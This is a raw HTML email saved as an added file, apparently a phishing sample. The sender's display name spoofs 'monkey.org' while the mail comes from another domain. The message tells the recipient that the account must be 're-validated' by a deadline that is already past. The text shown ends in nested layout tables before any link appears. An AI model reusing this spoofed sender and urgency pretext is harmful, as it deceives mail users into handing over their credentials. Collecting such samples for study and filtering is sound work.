@@ -1,0 +1,1028 @@
+Return-Path: rhea@manhuasao.com
+Delivered-To: jose@monkey.org
+X-FDA: 83724287178.40.9E06227
+Received: from dully.manhuasao.com (dully.manhuasao.com [86.106.104.242])
+	by imf07.b.hostedemail.com (Postfix) with ESMTP id 61A4FA000D
+	for <jose@monkey.org>; Thu, 31 Jul 2025 11:12:49 +0000 (UTC)
+Authentication-Results: imf07.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=cVpygHc9;
+	spf=pass (imf07.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1753960369; a=rsa-sha256;
+	cv=none;
+	b=XfoaxA5ahnnxuDi1NbZ0xlGQKFbMOR5oCfzR1rEBArZ+JmxIUtYzUY/80HibsX/z3RXcyn
+	Wavktxdl9BVIdvlYF7oTmVVGVoQ7kDWxWX8kbLMLlYAMU7ShN1e+jv26KjFb44lErCIDpP
+	euRfo6lwfiILYmvLtZmnAoQSKUW+otM=
+ARC-Authentication-Results: i=1;
+	imf07.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=cVpygHc9;
+	spf=pass (imf07.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1753960369;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=qf1yyzS0ESbvJhDGwPJz3NM3Ji3yXKcMdAG4VlHITWU=;
+	b=TXEUSG9GqyqBXB5RvU5Q9zLSZeXo+9CxwCIjWeZ8Hv4oUsb2woLM9ffdxfCRlUJk+TGxT5
+	QXEtWtol2UbeVxLOKl7tDJEZkhXxQEqnfsc7aU9FhJ9Vuy736fRXW35hA1JQ60JWlf8zaK
+	WS8WvpUUEn8WYIPWPasHMNbNV6nSUVY=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=manhuasao.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=rhea@manhuasao.com;
+ bh=AWhsP/0BBlXapO0KTJYuTNaK8xg=;
+ b=cVpygHc95mU+U/ErqqzzJAjbdTnOFMcMPssQYu6ovYidTSfIiYPJSHuuFFk4SHTb/9cbQuG1khT0
+   IPuOE9W/pbeVi++cb3WgJhzTfsd5sJDVZO0U3FVQq6B/8MofBlUCbRLrVm7ZTtEY5m2Jt5avSq+7
+   /vTfh9aVi/jvXCi+frhiBrqlYydAdz6CikWZCgsZ79XE9O1sMq7YEPcRfpt4IpT0o4pOFFNe8L3+
+   uDucbHpy1NpwndBafdnCHbVj/zoxZ/4OREGDx7VvrKb/ujkCMoVbvQIMdgEl/bdK+zjjSYARP29g
+   mXoz2Ua3RkWPOBX4pSf1OyYPQTOh16WEaHU89g==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=manhuasao.com;
+ b=CSGN8id8tbQEnP9PVipKpvbjIv6OzFQhziuYskpBZPz8d5TuPOGhgAbfXMfbqcdnIz9t5fBIP+Fw
+   EWlbOag2CrqviosLw5kBKocK03qryQXD8/NzJW47OYh6fgPW+1BidytHNkOwu/fKxcrqH/dy+Z/x
+   8JHyt+wfKLYxqdpGn3UW4S4h8UOrixtbJ2dvvBJObamC0ULlTS4meLSPEAQAVtkXYra313riyr0i
+   xPLkyX+eJBdiGUErw9vB/HPu+mXqjQJoULPu5KeDnmVnzKeFU3Y4hOcURG0oMRNxq6cumTsdXbOc
+   xPjfRsuhX7kH0yTaPAOml4he3DomfUPqq5PWJg==;
+From: monkey.org <rhea@manhuasao.com>
+To: jose@monkey.org
+Subject: Email Validation Notice for jose@monkey.org
+Date: 31 Jul 2025 13:12:47 +0200
+Message-ID: <20250731131247.5B2FBEC903A769DB@manhuasao.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 61A4FA000D
+X-Stat-Signature: f7h51ayarnqkcdqrao6zccqcqoerxoxt
+X-Rspam-User: 
+X-Spam-Status: No, score=6.32
+X-HE-Tag: 1753960369-732441
+X-HE-Meta: 
+ U2FsdGVkX1+xh+inCX8wR5of6Sn0GyBgDCwNwhUzaIoSuMJDBRHnS4udl8nApQpRYm4g/qum+4ghzio8L4qGsabPKExANDzIpq2WjnyHVUHKNxyp9vDJ+JsZkgMfCAs+0YO2Z7sSWkg1dDF5YodFFVMo1kyCTNslUrynscyvo+t8IEfaFElBgVFFsGNn4Whjxr64fwAVAMuT/98sLgur+RBqvHzd6c/0hXWsgH7rwIv2yFqwEkW6AhBOWHNdmihNK0lQbi+QHOkkFtq4CYaj9rmvBoi8J0NzKoqxqfjwmMOHZEAEYwo/2vqcCScpnn5j/s99Le0ACt6B8H2pWxYAkWg9kKekclJ1hL5xOBJHb+pBY9NCjO8IYm24lBxU+8pKBGtp9h9RiSUUc9HGkbVjLCX8xIjWeSnEk3uCRf83dfuKOdYvpkp4LXwdCKoo/rr1W/15kWwNguTUW+eCMO8POAmwDnusIatVFzkFwPjm7/6aPnVb2UraFYRFqZu3B7a77oNikIBOwj6pD7skHBggyru0PI5HSfAKoai/c18LWmWIRv0qztgGwoB56vnapAKuoWsj86wzNe7mjoOpK2zJ/gGGxpuCF82eLRNVc4vfaKxOAA4eKDozFEaTwIv4nQ6L8fNnvhncdzE9BNd7JW7zOiRUad4bXkl0LpX2t9xiec5r5K7b1AfLgw7lwjAcs80UPg7T2ngVHeEkblCshKS16kC3s6SezElTJx61hxjxeff5yWC+hTgdJMP5CbuLCqxwlq11yq+HthdRGZG/oQ4+QGfiUCIV/D/8aVMeGrcCEGLhCq14VLEzY/3kC4Nxhf1qViqE67obfugll5xy56xcS48wGTZz5PV7KpJ3RizVoJrbNXR4EYEA2pcYj3cQGDlun2DPd2emb7W46J+hxc9/AbwpOM2+oM9vbjuxklQOhJBpFc0oS7KXOo/ys1Lz4OHE3la/wGMK34fggSVxCk4Pr0HuMdM
+ Lu5vdzRcqDCp6w7l0Gct/iOTc+vVNeJ2sEjpFqEKEtBvCVpVRYhWUfHQPSkWKWJKKYzx7WFTtCBYAAjTMxumsh/8+fUa9XwD1w7aPsJJrruOfBck6/9T9beJuvaUNe87tbneMBRMtdYrxdtYlzWizi+2klgZwoBrL8g5nWyDzTLYEgzuSaBWt9GoBJhueKAwIk3FyJMF7EmpJjLg=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 318
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"100%" align=3D"center" style=3D"text-align: left; color: rg=
+b(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: R=
+oboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 400; wo=
+rd-spacing: 0px; white-space: normal; border-collapse: collapse; orphans: 2=
+; widows: 2;" bgcolor=3D"#fafafa" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" bgcolor=3D"#fafb=
+ff" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;"><br class=3D"App=
+le-interchange-newline">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px;"><a style=3D"color:=
+ rgb(0, 172, 255); text-decoration: none; background-color: transparent;" r=
+el=3D"noreferrer">
+<img width=3D"140" class=3D"CToWUd" style=3D"width: 140px; height: auto; ve=
+rtical-align: middle; display: block; max-width: 40px;" alt=3D"Webmail" src=
+=3D"https://ci3.googleusercontent.com/meips/ADKq_NYaCR10E3gqBClsD2ZG0_QRX7e=
+mdBnQbCsn5Ke0rU7xfdyIdlN-a9hbnhsgsPhJxeQBYJUGxQPNw4R8HMZw3PguSOcwnMCnayyU=
+=3Ds0-d-e1-ft#https://hunterfmradio.com/assets/img/logo/output.png" border=
+=3D"0" data-bit=3D"iit" height=3D"82"></a></td>
+<td align=3D"right" valign=3D"top" style=3D"margin: 0px; color: rgb(0, 0, 0=
+); line-height: 21px; font-family: roboto,helvetica,arial,sans-serif; font-=
+size: 14px; font-weight: bold;">Mail. Host. Online</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td height=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"20" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto,sans-serif=
+; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px;=
+ white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255=
+, 255);">
+<div>
+<table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse; =
+background-color: rgb(250, 250, 250);" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse; background-color:=
+ rgb(250, 251, 255);" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; color: rgb(47, 28, =
+106); line-height: 30px; letter-spacing: normal; font-family: "DM Sans",san=
+s-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,=
+sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-siz=
+e: 28px; font-style: normal; font-weight: bold;'><a style=3D"color: inherit=
+; text-decoration: none; background-color: transparent;"><span style=3D"col=
+or: rgb(47, 28, 106); text-decoration: none;"><span>Email
+account status changed</span></span></a></td>
+</tr>
+<tr>
+<td height=3D"24" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; color: rgb(47, 28, =
+106); line-height: 20px; letter-spacing: normal; font-family: "DM Sans",san=
+s-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,=
+sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-siz=
+e: 14px; font-style: normal; font-weight: 400;'>Dear jose, We are reaching =
+out to
+inform you
+that your email jose@monkey.org requires re-validation before<span>&nbsp;</=
+span><b style=3D"font-weight: bolder;">July 20, 2025</b><span>&nbsp;</span>=
+to
+ensure uninterrupted access to your email jose@monkey.org .</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div>
+<table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse; =
+background-color: rgb(250, 250, 250);" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse; background-color:=
+ rgb(250, 251, 255);" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"0" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"50" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 0px;"=
+>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" height=3D"0" style=3D"border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"middle" style=3D"margin: 0px; color: rgb(0, 0,=
+ 0); line-height: 0px; font-family: Arial,sans-serif; font-size: 14px; font=
+-style: normal; font-weight: 400;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 10px =
+0px 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" height=3D"0" style=3D"border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"middle" style=3D"margin: 0px; color: rgb(0, 0,=
+ 0); line-height: 0px; font-family: Arial,sans-serif; font-size: 14px; font=
+-style: normal; font-weight: 400;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 10px =
+0px 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" height=3D"0" style=3D"border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"middle" style=3D"margin: 0px; color: rgb(0, 0,=
+ 0); line-height: 0px; font-family: Arial,sans-serif; font-size: 14px; font=
+-style: normal; font-weight: 400;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"50" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td height=3D"0" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div>
+<table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse; =
+background-color: rgb(250, 250, 250);" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse; background-color:=
+ rgb(250, 251, 255);" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; color: rgb(47, 28, =
+106); line-height: 0px; letter-spacing: normal; font-family: "DM Sans",sans=
+-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,s=
+ans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size=
+: 14px; font-style: normal; font-weight: 400;'><br>
+</td>
+</tr>
+<tr>
+<td height=3D"25" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table style=3D"border-collapse: collapse;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" style=3D"margin: 0px; background-color: rgb(0, 0, 0);"=
+>
+<div>
+<div>
+<table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse; =
+background-color: rgb(244, 245, 255);" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse; background-color:=
+ rgb(250, 251, 255);" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; color: rgb(47, 28, =
+106); line-height: 20px; letter-spacing: normal; font-family: "DM Sans",san=
+s-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,=
+sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-siz=
+e: 14px; font-style: normal; font-weight: 400;'><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div>
+<table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse; =
+background-color: rgb(244, 245, 255);" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse; background-color:=
+ rgb(250, 251, 255);" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"0" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"50" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 0px;"=
+>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" height=3D"0" style=3D"border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"middle" style=3D"margin: 0px; color: rgb(0, 0,=
+ 0); line-height: 0px; font-family: Arial,sans-serif; font-size: 14px; font=
+-style: normal; font-weight: 400;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 10px =
+0px 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" height=3D"0" style=3D"border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"middle" style=3D"margin: 0px; color: rgb(0, 0,=
+ 0); line-height: 0px; font-family: Arial,sans-serif; font-size: 14px; font=
+-style: normal; font-weight: 400;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 10px =
+0px 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" height=3D"0" style=3D"border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"middle" style=3D"margin: 0px; color: rgb(0, 0,=
+ 0); line-height: 0px; font-family: Arial,sans-serif; font-size: 14px; font=
+-style: normal; font-weight: 400;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"50" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td height=3D"0" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div>
+<table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse; =
+background-color: rgb(244, 245, 255);" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse; background-color:=
+ rgb(250, 251, 255);" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; color: rgb(47, 28, =
+106); line-height: 0px; letter-spacing: normal; font-family: "DM Sans",sans=
+-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,s=
+ans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size=
+: 14px; font-style: normal; font-weight: 400;'><br>
+</td>
+</tr>
+<tr>
+<td height=3D"25" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px;">
+<table style=3D"border-collapse: collapse;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
